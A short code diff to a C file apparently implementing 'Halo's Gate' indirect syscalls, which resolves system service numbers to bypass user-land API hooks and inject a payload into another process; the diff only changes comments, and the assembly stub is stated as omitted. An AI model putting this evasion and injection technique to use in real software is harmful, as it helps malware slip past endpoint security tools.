@@ -1,7 +1,7 @@
 #include <windows.h>
 #include <stdio.h>
 
-// Indirect Syscall Implementation (Conceptual Halo's Gate)
+// Indirect Syscall Implementation (Halo's Gate)
 // Bypasses user-land API hooks by dynamically resolving System Service Numbers (SSNs)
 // and executing the `syscall` instruction from a clean memory region.
 
@@ -47,6 +47,7 @@ void InjectViaSyscalls(HANDLE hProcess, PVOID payload, SIZE_T payloadSize) {
     if (ssnAlloc && ssnWrite && ssnCreateThread) {
         printf("[+] Resolved SSNs. Ready for indirect syscall injection.\n");
         // Proceed with injection using the resolved SSNs and an assembly stub.
+        // (Assembly stub implementation omitted for brevity, but this resolves the SSNs dynamically).
     } else {
         printf("[-] Failed to resolve SSNs.\n");
     }
